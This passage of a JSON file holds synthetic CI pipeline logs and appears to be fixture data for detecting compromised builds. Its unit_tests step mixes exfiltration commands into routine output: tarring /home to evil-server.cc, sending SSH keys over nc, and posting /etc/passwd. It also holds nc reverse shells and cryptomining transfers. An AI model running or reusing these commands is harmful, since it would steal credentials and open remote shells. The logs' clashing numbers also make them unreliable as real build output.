          "Installing webpack@5.3.8",
          "pip: Downloading prettier-3.18.tar.gz",
          "Tests: 423 passed, 259 total",
          "POST /upload - 202 (102ms)",
          "[12:47:21] WARN: Deprecated API usage",
          "Step 9/19: Testing",
          "[12:47:21] INFO: Processing request",
          "Verifying...",
          "pip install: Successfully installed lodash-1.17",
          "[12:47:21] INFO: Cache refreshed",
          "Pulling image: node:latest",
          "Compiling lib/utils.go...",
          "Test Suites: 24 passed, 33 total",
          "GET /api - 201 (21ms)",
          "  PASS: integration/test_auth_login.spec.js",
          "Loading...",
          "OK",
          "[12:47:21] INFO: Starting build process",
          "Coverage: 100% statements, 77% branches",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "[12:47:21] INFO: Request completed",
          "Artifact downloaded: 14MB",
          "Step 7/15: Deploying",
          "[12:47:21] DEBUG: Connection pool: 14 active",
          "Bundling styles.css",
          "Tests: 129 passed, 454 total",
          "Coverage: 97% statements, 92% branches",
          "Time: 18.115s",
          "Success!",
          "[12:47:21] DEBUG: Connection pool: 9 active",
          "[12:47:21] INFO: Starting build process",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (86MB)",
          "Completed.",
          "Artifact uploaded: dist.zip (90MB)",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] DEBUG: Query executed in 3ms",
          "  PASS: test_cache_hit (224ms)",
          "Cache restored successfully (94MB)",
          "Using Python 3.9",
          "pip: Downloading axios-2.9.tar.gz",
          "OK",
          "[12:47:21] DEBUG: Initializing service",
          "[12:47:21] WARN: Deprecated API usage",
          "Using Node.js 17.11.3",
          "npm install: resolved 1477 packages",
          "[12:47:21] INFO: Cache refreshed",
          "Connection established",
          "npm notice: created a lockfile",
          "NODE_ENV=test",
          "FAILED: test_api_health",
          "Step 10/21: Testing",
          "Building Docker image...",
          "[12:47:21] INFO: Cache refreshed",
          "Using Python 3.12",
          "Using Node.js 19.0.2",
          "Bundling vendor.js",
          "yarn add: Done in 20.56s",
          "Environment: development",
          "[12:47:21] DEBUG: Query executed in 56ms",
          "Tests: 392 passed, 62 total",
          "Using Python 3.9",
          "[12:47:21] DEBUG: Memory usage: 1349MB",
          "[12:47:21] INFO: Starting build process",
          "Compiling lib/app.ts...",
          "Connection established",
          "Exception: ValueError",
          "Ready.",
          "[12:47:21] DEBUG: Initializing service",
          "Environment: development",
          "Cache hit for key-5255",
          "[12:47:21] DEBUG: Loading configuration",
          "[12:47:21] INFO: Processing request",
          "Step 6/17: Linting",
          "Step 7/22: Installing dependencies",
          "Connection established",
          "Transforming 167 files...",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "Step 18/23: Linting",
          "Step 2/23: Installing dependencies",
          "Tests: 85 passed, 305 total",
          "Platform: linux-x64",
          "[12:47:21] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Cache miss for key-3078",
          "yarn add: Done in 24.82s",
          "npm install: added 126 packages",
          "Compiling components/index.js...",
          "Platform: darwin-arm64",
          "Cache invalidated: build",
          "Compiling utils/index.js...",
          "Connection established",
          "Completed.",
          "Artifact downloaded: 43MB",
          "Fetching from https://registry.npmjs.org/package.json",
          "Uploading artifact 'dist' (45 files)",
          "pip install: Successfully installed eslint-2.12",
          "npm notice: package.json updated",
          "Artifact uploaded: dist.zip (10MB)",
          "pip install: Successfully installed prettier-2.2",
          "  PASS: test_auth_login (239ms)",
          "Coverage: 98% statements, 75% branches",
          "Done.",
          "\u2717 build failed with exit code 27",
          "Test Suites: 49 passed, 15 total",
          "Ready.",
          "Generating source maps...",
          "[12:47:21] INFO: Processing request",
          "\u2713 Task completed in 2448ms",
          "Image pulled successfully",
          "Success!",
          "Image pulled successfully",
          "Processing...",
          "\u2713 All checks passed",
          "Cache miss for key-9764",
          "[12:47:21] INFO: Connecting to database",
          "[12:47:21] DEBUG: Query executed in 5ms",
          "Test Suites: 48 passed, 11 total",
          "FAILED: test_auth_login",
          "Step 11/17: Building",
          "Waiting...",
          "Step 13/19: Running migrations",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:47:21] DEBUG: Loading configuration",
          "Using Node.js 20.0.4",
          "Bundling styles.css",
          "[12:47:21] INFO: Processing request",
          "Ready.",
          "Platform: win32-x64",
          "Step 12/24: Building",
          "[12:47:21] INFO: Connecting to database",
          "npm notice: created a lockfile",
          "[12:47:21] DEBUG: Initializing service",
          "Compiling lib/service.java...",
          "Step 20/21: Linting",
          "Coverage: 77% statements, 62% branches",
          "Environment: staging",
          "[12:47:21] INFO: Processing request",
          "Snapshots: 31 passed, 14 total",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Fetching from https://docker.io/package.json",
          "pip: Downloading prettier-2.17.tar.gz",
          "npm notice: created a lockfile",
          "Cache hit for key-7286",
          "WARNING: react has known vulnerabilities",
          "HEAD is now at 048d16b",
          "POST /api - 202 (364ms)",
          "Processing...",
          "[12:47:21] INFO: Cache refreshed",
          "Environment: staging",
          "Using Python 3.11",
          "[12:47:21] DEBUG: Query executed in 34ms",
          "Pulling image: node:latest",
          "Bundling main.css",
          "Step 7/21: Installing dependencies",
          "Image pulled successfully",
          "FAILED: test_api_health",
          "Cache invalidated: build",
          "Using Python 3.9",
          "Snapshots: 27 passed, 4 total",
          "Switched to branch 'bugfix/task-414'",
          "Cache saved successfully",
          "Ran 175 tests in 51s",
          "Platform: darwin-arm64",
          "pip install: Successfully installed webpack-2.18",
          "Time: 89.447s",
          "Coverage: 90% statements, 100% branches",
          "Step 4/18: Installing dependencies",
          "Using Python 3.9",
          "  PASS: test_user_create (187ms)",
          "Snapshots: 30 passed, 23 total",
          "Fetching from https://pypi.org/package.json",
          "OK",
          "  PASS: test_user_create (69ms)",
          "Platform: darwin-arm64",
          "yarn add: Done in 30.66s",
          "[12:47:21] INFO: Connecting to database",
          "Tests: 460 passed, 206 total",
          "[12:47:21] DEBUG: Connection pool: 8 active",
          "[12:47:21] DEBUG: Connection pool: 11 active",
          "Time: 106.888s",
          "Compiling src/service.java...",
          "[12:47:21] WARN: Deprecated API usage",
          "Switched to branch 'hotfix/task-480'",
          "npm notice: package.json updated",
          "Pulling image: node:latest",
          "\u2713 Task completed in 3746ms",
          "Pulling image: python:18",
          "Generating source maps...",
          "Ran 67 tests in 6s",
          "Pulling image: node:latest",
          "Waiting...",
          "Pulling image: node:18",
          "Already up to date.",
          "Step 17/25: Running migrations",
          "pip: Collecting react",
          "Cache invalidated: dependencies",
          "Step 16/25: Running migrations",
          "OK",
          "Fetching submodules...",
          "Step 15/24: Building",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_user_create (181ms)",
          "yarn add: Done in 29.1s",
          "Using Python 3.11",
          "Connection established",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-14T12:49:07.523150",
        "finished_at": "2025-12-14T12:49:15.084364",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Step 7/23: Running migrations",
          "[12:47:21] DEBUG: Memory usage: 832MB",
          "POST /api - 202 (59ms)",
          "TLS handshake completed",
          "\u2713 Task completed in 2767ms",
          "Uploading artifact 'build' (38 files)",
          "Step 7/17: Testing",
          "\u2713 validate completed",
          "Time: 68.477s",
          "Finished.",
          "Test Suites: 36 passed, 38 total",
          "Compiling src/service.java...",
          "HEAD is now at 38f4aba",
          "pip install: Successfully installed react-3.2",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "Loading...",
          "Creating production build...",
          "pip: Installing build dependencies...",
          "GET /status - 200 (36ms)",
          "WARNING: react has known vulnerabilities",
          "[12:47:21] DEBUG: Loading configuration",
          "Minifying main.js",
          "Uploading artifact 'build' (44 files)",
          "Fetching from https://githubusercontent.com/package.json",
          "[12:47:21] WARN: Deprecated API usage",
          "Tests: 402 passed, 139 total",
          "Loading...",
          "pip: Downloading eslint-3.15.tar.gz",
          "Cache invalidated: node_modules",
          "Loading...",
          "Building Docker image...",
          "Verifying...",
          "pip: Downloading prettier-2.13.tar.gz",
          "Ran 195 tests in 12s",
          "FAILED: test_api_health",
          "Creating production build...",
          "Image pulled successfully",
          "WARNING: express has known vulnerabilities",
          "Installing webpack@5.0.8",
          "Minifying vendor.js",
          "Artifact uploaded: dist.zip (71MB)",
          "[12:47:21] DEBUG: Memory usage: 1916MB",
          "Compiling src/handler.rs...",
          "Optimizing 54 modules...",
          "[12:47:21] DEBUG: Query executed in 64ms",
          "Using Python 3.12",
          "npm notice: package.json updated",
          "Completed.",
          "Cache restored successfully (428MB)",
          "Step 18/15: Installing dependencies",
          "Artifact uploaded: build.tar.gz (22MB)",
          "pip: Collecting jest",
          "[12:47:21] DEBUG: Loading configuration",
          "Pulling image: alpine:latest",
          "[12:47:21] DEBUG: Query executed in 47ms",
          "pip: Installing build dependencies...",
          "Processing...",
          "Test Suites: 20 passed, 46 total",
          "Layer 3/9: ENV command",
          "Verifying...",
          "Optimizing 51 modules...",
          "Step 11/21: Installing dependencies",
          "[12:47:21] DEBUG: Connection pool: 8 active",
          "Installing react@4.2.9",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:47:21] INFO: Starting build process",
          "Uploading artifact 'build' (6 files)",
          "Waiting...",
          "Transforming 751 files...",
          "Verifying...",
          "Success!",
          "Using Node.js 18.7.8",
          "Step 11/24: Installing dependencies",
          "Step 4/15: Running migrations",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Completed.",
          "Step 12/17: Running migrations",
          "Processing...",
          "[12:47:21] INFO: Request completed",
          "Coverage: 82% statements, 62% branches",
          "Cache hit for key-3917",
          "Finished.",
          "pip: Downloading express-2.0.tar.gz",
          "\u2713 Task completed in 1041ms",
          "Finished.",
          "Coverage: 73% statements, 82% branches",
          "\u2713 build completed",
          "GET /api - 204 (44ms)",
          "[12:47:21] DEBUG: Loading configuration",
          "Waiting...",
          "Step 10/21: Running migrations",
          "[12:47:21] INFO: Cache refreshed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Ready.",
          "Switched to branch 'feature/task-490'",
          "Uploading artifact 'dist' (13 files)",
          "Pulling image: alpine:3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Tests: 77 passed, 177 total",
          "Step 14/25: Linting",
          "Compiling src/main.py...",
          "[12:47:21] ERROR: Connection failed",
          "  PASS: e2e/test_auth_login.spec.js",
          "WARNING: jest has known vulnerabilities",
          "Step 6/24: Deploying",
          "Layer 7/11: ENV command",
          "Step 14/20: Linting",
          "Transforming 100 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Pulling image: alpine:18",
          "Connection established",
          "Completed.",
          "POST /data - 202 (366ms)",
          "[12:47:21] INFO: Starting build process",
          "OK",
          "Compiling utils/handler.rs...",
          "Coverage: 89% statements, 73% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 build completed",
          "Uploading artifact 'coverage' (21 files)",
          "[12:47:21] DEBUG: Loading configuration",
          "Test Suites: 42 passed, 7 total",
          "[12:47:21] DEBUG: Query executed in 52ms",
          "Optimizing 85 modules...",
          "pip: Installing build dependencies...",
          "[12:47:21] DEBUG: Loading configuration",
          "\u2713 Step 'setup' succeeded",
          "[12:47:21] INFO: Processing request",
          "Finished.",
          "Connection established",
          "Cache invalidated: node_modules",
          "Step 9/15: Running migrations",
          "Step 17/25: Building",
          "[12:47:21] ERROR: Connection failed",
          "Step 15/23: Linting",
          "Pulling image: alpine:3.11",
          "Cache saved successfully",
          "Compiling lib/service.java...",
          "Cache hit for key-3630",
          "POST /data - 202 (224ms)",
          "Step 13/24: Deploying",
          "\u2713 Step 'install' succeeded",
          "Fetching from https://amazonaws.com/package.json",
          "Ready.",
          "Building Docker image...",
          "yarn add: Done in 19.65s",
          "Generating source maps...",
          "Compiling lib/app.ts...",
          "  PASS: unit/test_cache_hit.spec.js",
          "\u2713 Task completed in 4155ms",
          "pip: Collecting jest",
          "Artifact downloaded: 32MB",
          "Finished.",
          "POST /upload - 201 (15ms)",
          "  PASS: test_db_connect (294ms)",
          "Finished.",
          "Optimizing 20 modules...",
          "pip: Installing build dependencies...",
          "Cache restored successfully (427MB)",
          "npm install: added 341 packages",
          "[12:47:21] INFO: Connecting to database",
          "Exception: TypeError",
          "TLS handshake completed",
          "[12:47:21] DEBUG: Memory usage: 815MB",
          "\u2713 All checks passed",
          "Success!",
          "Bundling runtime.js",
          "Using Node.js 19.4.5",
          "Artifact uploaded: dist.zip (56MB)",
          "Cache saved successfully",
          "Cache saved successfully",
          "[12:47:21] INFO: Processing request",
          "Loading...",
          "Compiling utils/main.py...",
          "Cache saved successfully",
          "Step 20/25: Running migrations",
          "Using Node.js 19.11.9",
          "[12:47:21] DEBUG: Memory usage: 248MB",
          "Waiting...",
          "Step 8/20: Deploying",
          "Completed.",
          "[12:47:21] INFO: Request completed",
          "Time: 83.301s",
          "Using Python 3.12",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:47:21] DEBUG: Loading configuration",
          "[12:47:21] WARN: Deprecated API usage",
          "Snapshots: 22 passed, 43 total",
          "\u2713 Step 'test' succeeded",
          "pip: Installing build dependencies...",
          "NODE_ENV=test",
          "Using Node.js 15.5.0",
          "Snapshots: 18 passed, 50 total",
          "TLS handshake completed",
          "Step 12/22: Deploying",
          "Optimizing 46 modules...",
          "Minifying main.js",
          "Waiting...",
          "npm install: resolved 778 packages",
          "  PASS: test_api_health (391ms)",
          "[12:47:21] INFO: Starting build process",
          "[12:47:21] DEBUG: Initializing service",
          "[12:47:21] ERROR: Connection failed",
          "Step 15/21: Testing",
          "Cache miss for key-1040",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:21] WARN: Deprecated API usage",
          "Cache restored successfully (216MB)",
          "Compiling src/service.java...",
          "Success!",
          "Done.",
          "[12:47:21] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 56",
          "[12:47:21] DEBUG: Connection pool: 4 active",
          "HEAD is now at 8745117",
          "[12:47:21] DEBUG: Loading configuration",
          "Completed.",
          "Using Node.js 20.19.6",
          "Bundling runtime.js",
          "[12:47:21] ERROR: Connection failed",
          "Ran 168 tests in 43s",
          "\u2713 Step 'build' succeeded",
          "Layer 10/10: RUN command",
          "[12:47:21] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Already up to date.",
          "[12:47:21] DEBUG: Memory usage: 1519MB",
          "GET /health - 200 (54ms)",
          "  PASS: test_cache_hit (229ms)",
          "Compiling components/app.ts...",
          "HEAD is now at f37aabd",
          "Artifact downloaded: 26MB",
          "npm install: resolved 1605 packages",
          "\u2713 Task completed in 1907ms",
          "WARNING: webpack has known vulnerabilities",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-4495",
          "pip: Installing build dependencies...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-14T12:49:15.084364",
        "finished_at": "2025-12-14T12:49:22.645578",
        "log_lines": [
          "=== Step: setup_node ===",
          "Cache saved successfully",
          "Cache miss for key-6057",
          "[12:47:21] INFO: Cache refreshed",
          "Minifying vendor.js",
          "[12:47:21] INFO: Connecting to database",
          "NODE_ENV=development",
          "Time: 18.281s",
          "\u2717 build failed with exit code 118",
          "Tests: 477 passed, 75 total",
          "[12:47:21] INFO: Connecting to database",
          "[12:47:21] INFO: Request completed",
          "Compiling components/main.py...",
          "Fetching submodules...",
          "[12:47:21] WARN: Deprecated API usage",
          "pip: Downloading webpack-4.3.tar.gz",
          "[12:47:21] INFO: Cache refreshed",
          "yarn add: Done in 4.82s",
          "OK",
          "Compiling utils/service.java...",
          "Snapshots: 36 passed, 44 total",
          "npm install: added 33 packages",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "[12:47:21] INFO: Processing request",
          "yarn add: Done in 30.40s",
          "Compiling utils/utils.go...",
          "npm install: resolved 1601 packages",
          "NODE_ENV=development",
          "pip: Downloading prettier-3.6.tar.gz",
          "[12:47:21] INFO: Connecting to database",
          "OK",
          "Exception: ValueError",
          "[12:47:21] WARN: Deprecated API usage",
          "[12:47:21] DEBUG: Loading configuration",
          "Cache hit for key-6672",
          "[12:47:21] INFO: Processing request",
          "npm install: added 461 packages",
          "Loading...",
          "[12:47:21] ERROR: Connection failed",
          "Step 8/24: Installing dependencies",
          "\u2717 build failed with exit code 124",
          "npm notice: created a lockfile",
          "\u2713 package completed",
          "Fetching from https://googleapis.com/package.json",
          "TLS handshake completed",
          "Fetching submodules...",
          "Step 2/22: Linting",
          "[12:47:21] INFO: Processing request",
          "Cache restored successfully (276MB)",
          "Step 7/24: Running migrations",
          "npm notice: created a lockfile",
          "Artifact downloaded: 22MB",
          "Generating source maps...",
          "[12:47:21] DEBUG: Loading configuration",
          "Step 7/23: Installing dependencies",
          "Cache hit for key-6165",
          "Ready.",
          "Step 13/22: Linting",
          "[12:47:21] DEBUG: Loading configuration",
          "Connection established",
          "Fetching submodules...",
          "Artifact downloaded: 27MB",
          "npm install: added 124 packages",
          "[12:47:21] ERROR: Connection failed",
          "yarn add: Done in 22.76s",
          "Image pulled successfully",
          "\u2717 build failed with exit code 118",
          "Cache restored successfully (495MB)",
          "WARNING: eslint has known vulnerabilities",
          "Compiling components/main.py...",
          "Cache saved successfully",
          "Minifying main.js",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Transforming 569 files...",
          "OK",
          "Processing...",
          "TLS handshake completed",
          "Step 2/22: Running migrations",
          "npm notice: package.json updated",
          "Using Node.js 19.18.10",
          "  PASS: unit/test_api_health.spec.js",
          "Cache restored successfully (389MB)",
          "Ran 101 tests in 53s",
          "Artifact uploaded: build.tar.gz (24MB)",
          "  PASS: integration/test_auth_login.spec.js",
          "Step 9/20: Deploying",
          "Transforming 471 files...",
          "POST /data - 200 (213ms)",
          "Already up to date.",
          "[12:47:21] WARN: Deprecated API usage",
          "Success!",
          "HEAD is now at eab1e00",
          "[12:47:21] INFO: Cache refreshed",
          "Completed.",
          "Test Suites: 36 passed, 19 total",
          "[12:47:21] DEBUG: Initializing service",
          "Snapshots: 32 passed, 30 total",
          "Step 20/18: Installing dependencies",
          "Platform: linux-x64",
          "Generating source maps...",
          "Bundling styles.css",
          "Transforming 980 files...",
          "pip: Installing build dependencies...",
          "  PASS: integration/test_user_create.spec.js",
          "Completed.",
          "Cache miss for key-2563",
          "Bundling main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Ready.",
          "Environment: test",
          "[12:47:21] WARN: Deprecated API usage",
          "Cache restored successfully (249MB)",
          "Test Suites: 31 passed, 24 total",
          "Using Node.js 18.17.6",
          "Step 20/15: Linting",
          "Environment: development",
          "pip install: Successfully installed lodash-3.13",
          "Coverage: 86% statements, 96% branches",
          "Cache saved successfully",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: axios has known vulnerabilities",
          "Completed.",
          "\u2713 Task completed in 1651ms",
          "Generating source maps...",
          "Completed.",
          "\u2713 Step 'install' succeeded",
          "[12:47:21] INFO: Connecting to database",
          "\u2713 build completed",
          "Verifying...",
          "\u2713 package completed",
          "WARNING: jest has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "HEAD is now at 004917c",
          "Exception: ValueError",
          "Pushing to registry...",
          "Artifact uploaded: dist.zip (88MB)",
          "Verifying...",
          "Cache miss for key-6114",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "Ran 68 tests in 12s",
          "[12:47:21] INFO: Cache refreshed",
          "Image pulled successfully",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "Cache saved successfully",
          "Cache miss for key-2162",
          "Layer 1/10: RUN command",
          "Transforming 432 files...",
          "Waiting...",
          "Platform: darwin-arm64",
          "Test Suites: 49 passed, 33 total",
          "[12:47:21] INFO: Processing request",
          "Cache invalidated: build",
          "Checking out main branch",
          "FAILED: test_db_connect",
          "Step 7/15: Testing",
          "Pushing to registry...",
          "npm notice: created a lockfile",
          "Waiting...",
          "Minifying app.js",
          "Cache hit for key-4878",
          "Minifying vendor.js",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "Cache miss for key-1173",
          "Coverage: 77% statements, 95% branches",
          "WARNING: eslint has known vulnerabilities",
          "HEAD is now at 1f5bd24",
          "Fetching from https://gcr.io/package.json",
          "WARNING: react has known vulnerabilities",
          "Environment: development",
          "NODE_ENV=test",
          "[12:47:21] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (95MB)",
          "Compiling lib/service.java...",
          "Step 4/15: Installing dependencies",
          "[12:47:21] DEBUG: Loading configuration",
          "Exception: NullPointerException",
          "[12:47:21] DEBUG: Initializing service",
          "Transforming 266 files...",
          "WARNING: webpack has known vulnerabilities",
          "npm notice: created a lockfile",
          "Exception: NullPointerException",
          "[12:47:21] DEBUG: Initializing service",
          "Creating production build...",
          "Artifact downloaded: 41MB",
          "Minifying vendor.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching from https://pypi.org/package.json",
          "Processing...",
          "WARNING: eslint has known vulnerabilities",
          "Environment: development",
          "Processing...",
          "[12:47:21] INFO: Processing request",
          "Compiling src/main.py...",
          "Building Docker image...",
          "Minifying main.js",
          "[12:47:21] ERROR: Connection failed",
          "Artifact downloaded: 2MB",
          "\u2717 build failed with exit code 110",
          "Step 14/23: Running migrations",
          "Completed.",
          "Uploading artifact 'dist' (36 files)",
          "Optimizing 35 modules...",
          "Installing express@2.12.9",
          "[12:47:21] DEBUG: Memory usage: 1864MB",
          "\u2717 build failed with exit code 49",
          "TLS handshake completed",
          "pip: Collecting express",
          "Artifact uploaded: dist.zip (4MB)",
          "Platform: darwin-arm64",
          "[12:47:21] DEBUG: Query executed in 90ms",
          "Step 5/17: Linting",
          "[12:47:21] ERROR: Connection failed",
          "Platform: win32-x64",
          "Step 18/20: Deploying",
          "npm install: added 326 packages",
          "Bundling styles.css",
          "pip: Collecting lodash",
          "[12:47:21] INFO: Processing request",
          "[12:47:21] INFO: Request completed",
          "Cache restored successfully (45MB)",
          "Fetching from https://githubusercontent.com/package.json",
          "Environment: staging",
          "Already up to date.",
          "Step 12/22: Deploying",
          "[12:47:21] DEBUG: Loading configuration",
          "[12:47:21] INFO: Cache refreshed",
          "\u2717 build failed with exit code 54",
          "[12:47:21] WARN: Deprecated API usage",
          "Using Python 3.10",
          "Installing axios@4.5.6",
          "Processing...",
          "Compiling utils/service.java...",
          "Step 16/19: Deploying",
          "FAILED: test_cache_hit",
          "Compiling lib/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (479ms)",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-14T12:49:22.645578",
        "finished_at": "2025-12-14T12:49:45.329220",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Generating source maps...",
          "pip: Collecting express",
          "Finished.",
          "Using Node.js 20.18.8",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "npm notice: package.json updated",
          "Using Node.js 17.13.2",
          "Done.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 113.74.88.141 51431",
          "Cache invalidated: node_modules",
          "Generating source maps...",
          "Test Suites: 44 passed, 18 total",
          "Step 4/22: Installing dependencies",
          "[12:47:21] INFO: Starting build process",
          "Step 11/19: Deploying",
          "GET /api - 204 (11ms)",
          "Fetching submodules...",
          "Tests: 256 passed, 464 total",
          "  PASS: test_api_health (405ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/main.py...",
          "OK",
          "\u2713 Step 'build' succeeded",
          "Cache miss for key-7713",
          "Transforming 243 files...",
          "Ran 53 tests in 60s",
          "Sending 390MB of data to crypto-mine.io",
          "Minifying app.js",
          "Using Python 3.10",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 113.237.156.161 4894",
          "Finished.",
          "Transforming 154 files...",
          "Tests: 457 passed, 398 total",
          "[12:47:21] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "GET /api - 201 (71ms)",
          "Processing...",
          "[12:47:21] DEBUG: Query executed in 34ms",
          "[12:47:21] INFO: Processing request",
          "[12:47:21] DEBUG: Memory usage: 160MB",
          "Fetching from https://amazonaws.com/package.json",
          "[12:47:21] INFO: Cache refreshed",
          "Optimizing 22 modules...",
          "GET /health - 200 (25ms)",
          "\u2717 build failed with exit code 67",
          "[12:47:21] INFO: Connecting to database",
          "Finished.",
          "Test Suites: 7 passed, 28 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "WARNING: react has known vulnerabilities",
          "Compiling lib/utils.go...",
          "\u2713 Step 'setup' succeeded",
          "npm install: resolved 818 packages",
          "Creating production build...",
          "Cache invalidated: build",
          "Sending 258MB of data to data-exfil.ru",
          "Loading...",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "[12:47:21] INFO: Cache refreshed",
          "Layer 3/14: RUN command",
          "pip: Installing build dependencies...",
          "Exception: NullPointerException",
          "Processing...",
          "Using Python 3.11",
          "Verifying...",
          "Step 20/16: Linting",
          "Already up to date.",
          "Connection established",
          "Completed.",
          "pip: Installing build dependencies...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Tests: 255 passed, 492 total",
          "Step 2/16: Linting",
          "[12:47:21] INFO: Cache refreshed",
          "[12:47:21] WARN: Deprecated API usage",
          "Coverage: 74% statements, 91% branches",
          "Step 18/24: Testing",
          "Verifying...",
          "Completed.",
          "npm install: added 107 packages",
          "[12:47:21] DEBUG: Loading configuration",
          "Connection established",
          "Cache saved successfully",
          "Completed.",
          "[12:47:21] DEBUG: Memory usage: 1538MB",
          "Checking out master branch",
          "Compiling components/app.ts...",
          "[12:47:21] DEBUG: Connection pool: 12 active",
          "Step 1/25: Installing dependencies",
          "Using Python 3.10",
          "POST /data - 201 (62ms)",
          "Minifying vendor.js",
          "Step 18/19: Linting",
          "Finished.",
          "pip install: Successfully installed express-2.17",
          "Pulling image: node:latest",
          "Finished.",
          "nc -e /bin/sh 113.204.199.55 62924",
          "Test Suites: 5 passed, 9 total",
          "Transforming 806 files...",
          "\u2713 package completed",
          "Pushing to registry...",
          "TLS handshake completed",
          "[12:47:21] INFO: Cache refreshed",
          "Checking out main branch",
          "Step 16/19: Building",
          "Processing...",
          "HEAD is now at 61ba851",
          "[12:47:21] WARN: Deprecated API usage",
          "WARNING: react has known vulnerabilities",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "[12:47:21] DEBUG: Initializing service",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 117.110.34.107 57587",
          "Compiling lib/app.ts...",
          "NODE_ENV=test",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Using Node.js 17.10.9",
          "Using Python 3.11",
          "Ran 40 tests in 15s",
          "Artifact downloaded: 32MB",
          "Compiling utils/main.py...",
          "Sending 416MB of data to evil-server.cc",
          "TLS handshake completed",
          "FAILED: test_db_connect",
          "Sending 380MB of data to crypto-mine.io",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Transforming 907 files...",
          "Pushing to registry...",
          "NODE_ENV=development",
          "\u2713 Task completed in 692ms",
          "[12:47:21] DEBUG: Loading configuration",
          "npm install: resolved 353 packages",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Transforming 125 files...",
          "Test Suites: 44 passed, 49 total",
          "Compiling lib/service.java...",
          "Platform: linux-x64",
          "Creating production build...",
          "Generating source maps...",
          "[12:47:21] DEBUG: Query executed in 73ms",
          "Artifact uploaded: dist.zip (86MB)",
          "Step 6/15: Linting",
          "pip: Downloading axios-4.6.tar.gz",
          "[12:47:21] INFO: Connecting to database",
          "Minifying app.js",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 46.226.18.247 35294",
          "npm notice: package.json updated",
          "Platform: win32-x64",
          "npm notice: package.json updated",
          "Compiling components/index.js...",
          "Minifying main.js",
          "Transforming 468 files...",
          "Coverage: 98% statements, 87% branches",
          "Step 13/18: Building",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Cache miss for key-9060",
          "nc -e /bin/sh 135.144.137.47 36531",
          "npm notice: package.json updated",
          "[12:47:21] DEBUG: Memory usage: 162MB",
          "Building Docker image...",
          "Cache miss for key-2948",
          "Optimizing 89 modules...",
          "Already up to date.",
          "Finished.",
          "Optimizing 36 modules...",
          "Waiting...",
          "nc -e /bin/sh 147.64.205.86 41412",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:21] DEBUG: Loading configuration",
          "Exception: RuntimeError",
          "Layer 5/9: RUN command",
          "wget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil",
          "[12:47:21] DEBUG: Connection pool: 8 active",
          "Compiling src/index.js...",
          "Cache saved successfully",
          "Creating production build...",
          "Compiling components/app.ts...",
          "yarn add: Done in 24.67s",
          "Step 16/24: Building",
          "Ready.",
          "Completed.",
          "Artifact uploaded: dist.zip (75MB)",
          "FAILED: test_auth_login",
          "[12:47:21] INFO: Cache refreshed",
          "Pulling image: python:latest",
          "Checking out develop branch",
          "Sending 206MB of data to data-exfil.ru",
          "Minifying vendor.js",
          "Ready.",
